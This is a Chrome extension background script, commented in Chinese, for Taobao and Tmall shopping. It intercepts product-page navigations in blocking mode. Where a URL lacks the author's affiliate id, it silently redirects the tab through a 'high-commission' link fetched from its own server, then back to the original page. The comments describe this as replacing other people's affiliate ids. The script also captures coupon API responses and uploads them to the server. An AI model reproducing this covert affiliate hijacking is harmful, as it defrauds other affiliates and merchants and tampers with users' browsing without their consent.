//webSocket
var WS = null,Host = 'http://es.com',WSFD = 0;
try {
     WS = new ReconnectingWebSocket('ws://es.com:9501', null, {debug: true, reconnectInterval: 3000});

    WS.onopen = (evt) => {
        console.log('websocket连接开启', evt);
        //todo 发送用户信息
    };

    WS.onclose = (evt) => {
        //todo 告诉服务器关闭 不然造成fd的浪费
        console.log('websocket连接关闭', evt);
    };

    WS.onmessage = (evt) => {
        console.log('websocket收到数据', evt);
    };

    WS.onerror = (evt, e) => {
        //todo 通过ajax 告诉 服务器杀掉fd
        console.log('websocket发生错误', evt, e);
    };
} catch (e) {
    console.log('websocket连接失败', e);
}

/**
 * 工具类
 * @type {{wsSend: Util.wsSend}}
 */
var Util = {
    /**
     * websocket发送数据
     * @param data {url:{class:'',action:''},data:data}
     */
    wsSend:function (data) {
        //判断ws是否连接ok
        if (!WS) {
            console.log('WS对象为空');
            return ;
        }
        WS.send(JSON.stringify(data));
    },
    getGY:function (data,async) {
        $.ajax({
            url:Host+'/coupon/gy',
            method:'POST',
            data:data,
            async:async,
            dataType:'json',
            timeout:1000,
            success:function (d) {
                if (d != -1 && d.item_url){
                    sessionStorage[data.num_iid] = JSON.stringify(d);
                }
            },
            error:function (xhr,status,error) {
                console,log("错误提示： " + xhr.status + " " + xhr.statusText);
            },
            complete : function(XMLHttpRequest,status){ //请求完成后最终执行参数
                if(status == 'timeout'){
                    console.log("请求超时，请稍后再试！",'','error');
                }
            }
        });
    },
    //更新优惠券
    upCoupon:function (data) {
        $.ajax({
            url:Host+'/coupon/update',
            method:'POST',
            data:data,
            dataType:'json',
            timeout:1000
        });
    }
};
/**
 * 与conten_script通信 与服务端通信
 */
chrome.extension.onRequest.addListener(function(r, sender, sendResponse){
    console.log(r);
    switch (r.type) {
        //解析click url 跳转后的302 location
        case 'getClickUrl':
            if (sessionStorage[r.data.num_iid]) {
                return;
            }
            Util.getGY(r.data, true);
           break;
    }
});
// web请求监听，最后一个参数表示阻塞式，需单独声明权限：webRequestBlocking ["<all_urls>"]
chrome.webRequest.onBeforeRequest.addListener(details => {
    console.log(details);
    //优惠券页面
    if (details.url.indexOf('acs.m.taobao.com/h5/mtop.alimama.union.hsf.coupon.get') != -1) {
        $.ajax({
            url:details.url,
            method:'GET',
            dataType:'text',
            timeout:1000,
            success:function (d) {
                if (d.indexOf('mtopjsonp2(')!=-1){
                    d = JSON.parse(d.slice(d.indexOf('(') + 1,-1));
                    if (d.ret[0] == 'SUCCESS::调用成功' && d.data && d.data.success) {
                        d = d.data.result;
                        var id = d.item.itemId;
                        sessionStorage['coupon_'+id] = d.amount;
                        //上传优惠券 无论失效与否
                        Util.upCoupon(d);
                    }
                }
            },
            error:function (xhr,status,error) {
                console.log("错误提示： " + xhr.status + " " + xhr.statusText,error);
            }
        });
    } else if(details.type == 'main_frame') {
        //宝贝页面 先获取商品id
        var id = details.url.match(/[\?&]id=(\d{8,15})/);
        if(id) {
            id = id[1];
        }
        //判断跳转详情页面时不是自己的pid 就替换掉
        if (details.url.indexOf('mm_119948269') == -1) {

            if (sessionStorage['tab_'+id] && sessionStorage['tab_'+id] == details.tabId) {
                //表示刷新当前页面 并且 已经跳转过高佣连接而来
                return;
            }
            //如果没有商品id做key的session 表示没有生成高佣跳转链接
            if (!sessionStorage[id]) {
                //以同步的方式生成高佣后再继续往下执行
                Util.getGY({num_iid:id}, false);
                if (!sessionStorage[id]) {
                    return;
                }
            }
            //json 解析出高佣链接item_url
            var data = JSON.parse(sessionStorage[id]);
            if (data && data.item_url) {
                //暂存之前过来的原链接 在高佣链接跳转后再劫持 改为此链接 之后删除
                sessionStorage['src_url_'+id] = details.url;
                //记录好高佣跳转成功的tabid 方便用户刷新时 不在跳转高佣链接
                sessionStorage['tab_'+id]=details.tabId;
                return {redirectUrl: data.item_url};
            }
        } else if(sessionStorage['tab_'+id]) {
            //这里处理得是用户从高佣跳转后造成的页面跳转失败问题
            var url = sessionStorage['src_url_'+id];
            sessionStorage.removeItem('src_url_'+id);
            return {redirectUrl: url};
        }
    }

}, {
    urls: ["*://detail.tmall.com/item.htm*","*://item.taobao.com/item.htm*",
    "*://acs.m.taobao.com/h5/mtop.alimama.union.hsf.coupon.get*"],
    types:["main_frame","other","script"]
}, ["blocking"]);